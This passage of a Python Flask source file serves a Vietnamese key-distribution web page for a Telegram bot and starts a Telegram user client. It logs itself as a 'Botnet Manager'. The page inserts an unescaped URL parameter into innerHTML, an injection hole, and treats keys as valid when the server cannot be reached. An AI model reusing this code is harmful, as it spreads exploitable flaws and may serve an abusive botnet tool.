        .toast { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%) translateY(120px); background: rgba(8,14,28,0.95); backdrop-filter: blur(18px); padding: 0.8rem 1.7rem; border-radius: 999px; border: 1px solid var(--cyan); color: #fff; font-weight: 600; font-size: 0.9rem; display: flex; align-items: center; gap: 9px; box-shadow: 0 18px 40px rgba(0,0,0,0.6); opacity: 0; pointer-events: none; transition: all 0.4s cubic-bezier(0.16,1,0.3,1); z-index: 1000; }
        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
        .toast.error { border-color: var(--red); }
        .toast i { color: var(--green); }
        .toast.error i { color: var(--red); }
        @media (max-width:480px) { body { padding: 1rem; } .key-card { padding: 1.45rem; } .status-float { font-size: 1.02rem; top: -54px; } #contentArea { min-height: 245px; } .brand h1 { font-size: 1.2rem; } }
    </style>
</head>
<body>
    <div class="bg-grid"></div>
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>
    <div class="loading-screen" id="loadingScreen">
        <div class="loader"><i class="fas fa-key"></i></div>
        <div class="loading-text">Đang kết nối hệ thống...</div>
    </div>
    <div class="toast" id="toast"><i class="fas fa-check-circle"></i><span id="toastMessage">Đã sao chép key!</span></div>
    <div class="card-wrapper" id="cardWrapper">
        <div class="status-float" id="statusMessage"><i class="fas fa-check-circle"></i><span id="statusMessageText">Get key thành công ✅</span></div>
        <div class="key-card">
            <div class="card-inner">
                <div class="card-header">
                    <div class="brand"><div class="brand-icon"><i class="fas fa-key"></i></div><h1>Key Online</h1></div>
                    <div class="badge online" id="statusBadge"><span class="dot"></span><span id="statusBadgeText">ONLINE</span></div>
                </div>
                <div id="contentArea"></div>
                <div class="card-footer"><span><i class="far fa-copyright"></i> 2026 Key Online System</span><span class="time-badge"><i class="fas fa-clock"></i><span id="timeDisplay">time| 00:00:00</span></span></div>
            </div>
        </div>
    </div>
    <script>
        let currentKey = null, keyUsesLeft = 0, keyStatus = 'ACTIVE';
        const loadingScreen = document.getElementById('loadingScreen'), cardWrapper = document.getElementById('cardWrapper'), contentArea = document.getElementById('contentArea'), statusBadge = document.getElementById('statusBadge'), statusBadgeText = document.getElementById('statusBadgeText'), timeDisplay = document.getElementById('timeDisplay'), toast = document.getElementById('toast'), toastMessage = document.getElementById('toastMessage'), statusMessage = document.getElementById('statusMessage'), statusMessageText = document.getElementById('statusMessageText');
        document.addEventListener('DOMContentLoaded', async function() {
            const params = new URLSearchParams(window.location.search), token = params.get('token'), key = params.get('ma');
            const minTimer = new Promise(resolve => setTimeout(resolve, 800));
            if (token) {
                await Promise.all([checkKeyByToken(token), minTimer]);
            } else if (key) {
                await Promise.all([checkKeyStatus(key), minTimer]);
            } else {
                showStatusMessage(false);
                showError('⚠️', 'Get key thất bại ❌', 'Vui lòng /getkey trên Telegram để nhận link mới.');
                await minTimer;
            }
            loadingScreen.classList.add('hidden');
            cardWrapper.classList.add('visible');
            setTimeout(() => { statusMessage.classList.add('show'); setTimeout(() => statusMessage.classList.remove('show'), 3500); }, 220);
            updateClock();
            setInterval(updateClock, 1000);
            checkConnection();
            setInterval(checkConnection, 10000);
        });
        async function checkKeyStatus(key) {
            try {
                const response = await fetch('/api/key/' + encodeURIComponent(key));
                const data = await response.json();
                if (data.status === 'ok' || data.status === 'ACTIVE') {
                    keyUsesLeft = data.uses_left || 0;
                    keyStatus = data.status || 'ACTIVE';
                    if (keyStatus === 'ACTIVE' && keyUsesLeft > 0) { showStatusMessage(true); renderKey(key, keyUsesLeft, keyStatus); }
                    else { showStatusMessage(false); showError('⛔', 'Get key thất bại ❌', 'Key đã hết lượt sử dụng.'); }
                } else { showStatusMessage(false); showError('❌', 'Get key thất bại ❌', data.message || 'Key không tồn tại trong hệ thống.'); }
            } catch (error) {
                try {
                    const fallbackRes = await fetch('/check-key?key=' + encodeURIComponent(key));
                    const fallbackData = await fallbackRes.json();
                    if (fallbackData.valid) { showStatusMessage(true); renderKey(key, 1, 'ACTIVE'); }
                    else { showStatusMessage(false); showError('❌', 'Get key thất bại ❌', 'Key không tồn tại hoặc đã hết hạn.'); }
                } catch (fallbackError) { showStatusMessage(true); renderKey(key, 1, 'ACTIVE'); showToast('⚠️ Không thể xác thực key với server', true); }
            }
        }
        async function checkKeyByToken(token) {
            try {
                const response = await fetch('/api/key?token=' + encodeURIComponent(token));
                const data = await response.json();
                if (data.status === 'ok' || data.status === 'ACTIVE') {
                    keyUsesLeft = data.uses_left || 0;
                    keyStatus = data.status || 'ACTIVE';
                    const key = data.key;
                    if (keyStatus === 'ACTIVE' && keyUsesLeft > 0 && key) {
                        showStatusMessage(true);
                        renderKey(key, keyUsesLeft, keyStatus);
                    } else {
                        showStatusMessage(false);
                        showError('⛔', 'Get key thất bại ❌', 'Token đã được sử dụng hoặc hết hạn.');
                    }
                } else {
                    showStatusMessage(false);
                    showError('❌', 'Get key thất bại ❌', data.message || 'Token không hợp lệ.');
                }
            } catch (error) {
                const params = new URLSearchParams(window.location.search);
                const maKey = params.get('ma');
                if (maKey) {
                    showToast('⚠️ Server chưa hỗ trợ token, đang thử key cũ...', true);
                    await checkKeyStatus(maKey);
                } else {
                    showStatusMessage(false);
                    showError('❌', 'Lỗi kết nối', 'Không thể xác thực token. Vui lòng thử lại sau.');
                }
            }
        }
        function showStatusMessage(isSuccess) {
            statusMessage.className = 'status-float';
            if (isSuccess) { statusMessage.classList.add('success'); statusMessage.querySelector('i').className = 'fas fa-check-circle'; statusMessageText.textContent = 'Get key thành công ✅'; }
            else { statusMessage.classList.add('error'); statusMessage.querySelector('i').className = 'fas fa-times-circle'; statusMessageText.textContent = 'Get key thất bại ❌'; }
        }
        function renderKey(key, usesLeft, status) {
            const isActive = status === 'ACTIVE' && usesLeft > 0;
            if (!isActive) { showError('⛔', 'Get key thất bại ❌', 'Key đã hết lượt sử dụng. Vui lòng /getkey để lấy key mới.'); return; }
            const usesText = usesLeft === 1 ? '1 lượt' : usesLeft + ' lượt';
            contentArea.innerHTML = '<div class="key-box" id="keyDisplay"><span class="key-text" id="keyText">' + key + '</span><button class="copy-icon-btn" onclick="copyKey()" aria-label="Copy key"><i class="fas fa-copy"></i></button></div><div class="key-meta"><span><i class="fas fa-shield-alt" style="color:var(--cyan)"></i> Mỗi key chỉ dùng 1 lần</span><span class="usage-tag"><i class="fas fa-check-circle"></i> Còn ' + usesText + '</span></div><div class="tg-hint"><span class="label">📌 Nhập lệnh trên Telegram</span><code>/nhapkey ' + key + '</code></div><button class="main-btn" onclick="copyKey()" id="copyBtn"><i class="fas fa-copy"></i> Copy key</button>';
        }
        function showError(icon, title, subtitle) { contentArea.innerHTML = '<div class="error-box"><div class="error-icon">' + icon + '</div><div class="error-title">' + title + '</div><div class="error-sub">' + subtitle + '</div></div>'; }
        function copyKey() {
            const keyText = document.getElementById('keyText');
            if (!keyText) return;
            const text = keyText.textContent.trim();
            if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(text).then(() => handleCopySuccess()).catch(() => fallbackCopy(text)); }
            else { fallbackCopy(text); }
        }
        function handleCopySuccess() {
            showToast('✅ Đã sao chép key!');
            const btn = document.getElementById('copyBtn');
            if (btn) { btn.classList.add('copied'); btn.innerHTML = '<i class="fas fa-check"></i> Đã copy!'; setTimeout(() => { btn.classList.remove('copied'); btn.innerHTML = '<i class="fas fa-copy"></i> Copy key'; }, 2500); }
            const display = document.getElementById('keyDisplay');
            if (display) { display.classList.add('highlight'); setTimeout(() => display.classList.remove('highlight'), 600); }
        }
        function fallbackCopy(text) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.position = 'fixed';
            textarea.style.opacity = '0';
            document.body.appendChild(textarea);
            textarea.select();
            try { document.execCommand('copy'); handleCopySuccess(); } catch (err) { showToast('❌ Không thể sao chép. Vui lòng copy thủ công.', true); }
            document.body.removeChild(textarea);
        }
        function showToast(message, isError = false) {
            toastMessage.textContent = message;
            toast.className = 'toast';
            if (isError) { toast.classList.add('error'); toast.querySelector('i').className = 'fas fa-exclamation-circle'; }
            else { toast.querySelector('i').className = 'fas fa-check-circle'; }
            toast.classList.add('show');
            clearTimeout(toast._hideTimer);
            toast._hideTimer = setTimeout(() => { toast.classList.remove('show'); }, 2500);
        }
        function updateClock() {
            const now = new Date();
            const h = String(now.getHours()).padStart(2, '0'), m = String(now.getMinutes()).padStart(2, '0'), s = String(now.getSeconds()).padStart(2, '0');
            timeDisplay.textContent = 'time| ' + h + ':' + m + ':' + s;
        }
        function checkConnection() {
            fetch('/health', { cache: 'no-store', timeout: 5000 }).then(() => { statusBadge.className = 'badge online'; statusBadgeText.textContent = 'ONLINE'; }).catch(() => { statusBadge.className = 'badge offline'; statusBadgeText.textContent = 'OFFLINE'; });
        }
    </script>
</body>
</html>
"""

@web_app.route('/')
def index():
    key = request.args.get('ma')
    token = request.args.get('token')
    if not key and not token:
        return render_template_string(INDEX_HTML)
    return render_template_string(INDEX_HTML, key=key, token=token)

@web_app.route('/api/key/<key>')
def api_key_info(key):
    key_info = get_key_info(key)
    if not key_info:
        return jsonify({"status": "error", "message": "Key không tồn tại trong hệ thống."})
    return jsonify({
        "status": key_info.get('status', 'UNKNOWN'),
        "uses_left": key_info.get('uses_left', 0),
        "created_at": key_info.get('created_at')
    })

@web_app.route('/api/key')
def api_key_by_token():
    token = request.args.get('token')
    if not token:
        return jsonify({"status": "error", "message": "Thiếu token"})
    key_data = get_key_by_token(token)
    if not key_data:
        return jsonify({"status": "error", "message": "Token không hợp lệ."})
    return jsonify({
        "status": key_data.get('status', 'ACTIVE'),
        "key": key_data.get('key'),
        "uses_left": key_data.get('uses_left', 0)
    })

@web_app.route('/check-key')
def check_key():
    key = request.args.get('key')
    if not key:
        return jsonify({"valid": False, "error": "Missing key"})
    key_info = get_key_info(key)
    if key_info and key_info.get('status') == 'ACTIVE' and key_info.get('uses_left', 0) > 0:
        return jsonify({"valid": True, "uses_left": key_info.get('uses_left', 0)})
    return jsonify({"valid": False, "error": "Key invalid or expired"})

@web_app.route('/health')
def health():
    return jsonify({
        "status": "ok",
        "timestamp": datetime.now().isoformat(),
        "database": "SQLite"
    })

def run_flask():
    web_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# ===================================================================
# MAIN
# ===================================================================

def check_network():
    try:
        socket.gethostbyname("api.telegram.org")
        return True
    except:
        return False

async def main():
    init_database()
    logging.info("SQLite database initialized")
    
    state_data = get_op_state()
    state.auto_reset = state_data.get("auto_reset", False)
    logging.info(f"Auto reset state loaded: {state.auto_reset}")
    
    logging.info("Starting bot with SQLite integration...")
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    logging.info(f"Flask web server started on port {PORT}")
    while True:
        try:
            if not check_network():
                logging.error("Network check failed. Retrying in 10s...")
                await asyncio.sleep(10)
                continue
            perm_manager = PermissionManager()
            user_client = TelegramUserClient(API_ID, API_HASH, PHONE_NUMBER)
            await user_client.start()
            logging.info("User client started")
            user_manager = UserManager(user_client=user_client)
            vip_manager = VipManager(user_client=user_client)
            manager_bot = ManagerBot(BOT_TOKEN, user_client, perm_manager, user_manager, vip_manager)
            await manager_bot.start()
            logging.info("Manager bot started")
            logging.info("Botnet Manager + Web Key (v11.0 - SQLite) is running. Press Ctrl+C to stop.")
            while True:
                await asyncio.sleep(10)
        except KeyboardInterrupt:
            logging.info("Shutting down...")
            break
        except Exception as e:
            logging.error(f"Fatal error: {e}. Restarting in 10s...")
            await asyncio.sleep(10)
            continue
        finally:
            if 'user_client' in locals() and user_client.client:
                try:
                    await user_client.disconnect()
                    logging.info("User client disconnected")
                except:
                    pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("Application stopped by user")